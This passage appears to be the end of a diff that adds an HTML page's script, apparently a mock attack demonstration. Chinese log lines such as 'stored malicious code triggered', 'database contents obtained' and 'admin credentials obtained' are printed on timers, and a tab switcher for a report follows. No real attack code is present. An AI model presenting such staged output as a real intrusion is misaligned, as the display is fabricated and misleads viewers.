+                    { text: '> 触发存储的恶意代码...', delay: 5000 },
+                    { text: '> 成功获取数据库内容!', delay: 5500 },
+                    { text: '> 提取敏感信息...', delay: 6000 },
+                    { text: '> 获取管理员凭证成功!', delay: 6500 },
+                    { text: '> 攻击成功完成!', delay: 7000 }
+                ];
+                
+                let totalDelay = 0;
+                logMessages.forEach(message => {
+                    totalDelay += message.delay;
+                    setTimeout(() => {
+                        const logEntry = document.createElement('div');
+                        logEntry.className = 'log-entry';
+                        logEntry.textContent = message.text;
+                        successLog.appendChild(logEntry);
+                        successLog.scrollTop = successLog.scrollHeight;
+                    }, totalDelay);
+                });
+            }
+        }
+        
+        // 报告选项卡切换功能
+        const reportTabs = document.querySelectorAll('.report-tab');
+        const reportContents = document.querySelectorAll('.report-content');
+        
+        if (reportTabs.length > 0 && reportContents.length > 0) {
+            // 初始化显示第一个选项卡
+            reportTabs[0].classList.add('active');
+            reportContents[0].style.display = 'block';
+            
+            reportTabs.forEach((tab, index) => {
+                tab.addEventListener('click', function() {
+                    // 隐藏所有内容
+                    reportContents.forEach(content => {
+                        content.style.display = 'none';
+                    });
+                    
+                    // 移除所有选项卡的活动状态
+                    reportTabs.forEach(t => {
+                        t.classList.remove('active');
+                    });
+                    
+                    // 显示当前选项卡对应的内容
+                    reportContents[index].style.display = 'block';
+                    tab.classList.add('active');
+                });
+            });
+        }
+    });
+</script>
+</body>
+</html>
